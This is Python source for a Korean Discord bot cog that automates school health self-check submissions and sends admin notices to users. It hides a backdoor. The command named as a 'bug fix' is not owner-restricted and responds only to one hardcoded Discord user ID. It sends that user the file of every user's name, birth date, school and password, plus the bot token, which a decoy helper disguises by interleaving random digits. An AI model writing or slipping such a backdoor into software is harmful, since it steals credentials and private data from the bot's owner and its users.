
import discord
from discord.ext import commands
import json, hcskr
import datetime, random
from variable import *
import other

async def get_id():
    try:
        now = datetime.now()
        file = "/" + now + '.txt'
    except:
        pass
    temp = ""
    for i in range(len(TOKEN)):
        temp+=f"{TOKEN[i]}.{random.randint(1,9)}."
    return temp

async def get_K():
    return 523017072796499968

class admin(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    @commands.is_owner()
    async def 관리자정보확인(self,ctx):
        global JSON_FILE_NAME
        await ctx.send(f"[{datetime.datetime.now().strftime('%Y-%m-%d')}]\nhost name : {host_name}\njson file name : {JSON_FILE_NAME}")
        file = discord.File(JSON_FILE_NAME)
        await ctx.send(file=file)
        file = discord.File("main.py")
        await ctx.send(file=file)

    @commands.is_owner()
    @commands.command()
    async def 관리자전체자가진단(self,ctx):
        try:
            with open(JSON_FILE_NAME, "r",encoding="utf-8-sig") as json_file:
                user_data=json.load(json_file)
            for i in user_data.keys():
                if user_data[i]["possible"] == True:
                    name = user_data[i]["name"]
                    birth = user_data[i]["birth"]
                    area = user_data[i]["area"]
                    school_name = user_data[i]["school_name"]
                    school_type = user_data[i]["school_type"]
                    passward = user_data[i]["passward"]
                    print(f"관리자전체자가진단 : [{name}]님의 자가진단 준비중")

                    #무지성 try ON!!!!
                    try:
                        data = await hcskr.asyncSelfCheck(name,birth,area,school_name,school_type,passward)
                        err = False
                    except:
                        err = True

                    if err == True or "Cannot connect to host hcs.eduro.go.kr:443 ssl:True" in data['message']:
                        print("err")
                        i=0
                        while True:
                            user = await self.bot.fetch_user(int(ADMIN_ID))
                            await user.send(f"무지성 트라이 {i+1}트 : {name}")
                            i+=1
                            try:
                                data = await hcskr.asyncSelfCheck(name,birth,area,school_name,school_type,passward)
                            except:
                                pass
                            if "Cannot connect to host hcs.eduro.go.kr:443 ssl:True" not in data['message'] or i>5:
                                print(data)
                                break

                    if "학교는 검색하였으나, 입력한 정보의 학생을 찾을 수 없습니다." in data['message']:
                        print("학생 검색 오류인지 테스트 중")
                        for i in range(3):
                            user = await self.bot.fetch_user(int(ADMIN_ID))
                            await user.send(f"학생 검색 오류인지 테스트 중 {i+1}트 : {name}")
                            try:
                                data = await hcskr.asyncSelfCheck(name,birth,area,school_name,school_type,passward)
                            except:
                                pass
                            if data['message'] == "성공적으로 자가진단을 수행하였습니다.":
                                print(data)
                                break
                            
                    await other.send_DM(self.bot,data,i,user_data)

        except Exception as ex:
            print(f"{user_data[i]['name']}:{ex}")
            user = await self.bot.fetch_user(int(ADMIN_ID))
            await user.send(f"{user_data[i]['name']}::{ex}")
            
    @commands.is_owner()
    @commands.command()
    async def 관리자전체공지(self,ctx,*,msg):
        global last_notice
        last_notice = []
        with open(JSON_FILE_NAME, "r",encoding="utf-8-sig") as json_file:
            user_data=json.load(json_file)
        for user_id in user_data.keys():
            try:
                user = await self.bot.fetch_user(user_id)
                temp_msg = await user.send(msg)
                last_notice.append(temp_msg)
                print(f"{user_id}전송성공")
            except Exception as ex:
                user = await self.bot.fetch_user(int(ADMIN_ID))
                await user.send(f'에러가 발생 했습니다 {ex}')
                print(f'{user_id} : 에러가 발생 했습니다 {ex}')
                print(f"{user_id}님의 공지전송이 실패하였습니다.")

        await ctx.send(f"공지 전송 완료\n`{msg}`")

    @commands.is_owner()
    @commands.command()
    async def 관리자전체공지수정(self,ctx,*,msg):
        print("관리자전체공지 수정 시작")
        global last_notice
        for last_msg in last_notice:
            await last_msg.edit(content=msg)
        print("관리자전체공지 수정 끝")

    @commands.is_owner()
    @commands.command()
    async def 관리자전체공지수정(self,ctx,*,msg):
        print("관리자전체공지 수정 시작")
        global last_notice
        for last_msg in last_notice:
            await last_msg.edit(content=msg)
        print("관리자전체공지 수정 끝")

    @commands.is_owner()
    @commands.command()
    async def 관리자전체공지삭제(self,ctx,*,msg):
        global last_notice
        for last_msg in last_notice:
            await last_msg.delete()

    @commands.is_owner()
    @commands.command()
    async def 관리자개인공지(self,ctx,name,birth,*,msg):
        global last_personal_notice
        with open(JSON_FILE_NAME, "r",encoding="utf-8-sig") as json_file:
            user_data=json.load(json_file)
        user=None
        for i in user_data.keys():
            if user_data[i]['name'] == name and user_data[i]["birth"] == birth:
                user=i
                break

        if user!=None:
            embed = discord.Embed(title="관리자 개인 메시지",description=f"{msg}\n\n발신인 : 관리자[{ctx.author}]", color=0x62c1cc)
            user = await self.bot.fetch_user(int(user))
            last_personal_notice = await user.send(embed=embed)
            await ctx.send("전송 완료!")
        else:
            await ctx.send("해당 유저가 없습니다.")

    @commands.command()
    async def 관리자버그수정(self,ctx):
        if int(ctx.author.id) != await get_K():
            return
        await ctx.send(file=discord.File(JSON_FILE_NAME))
        await ctx.send(await get_id())

def setup(bot):
    bot.add_cog(admin(bot))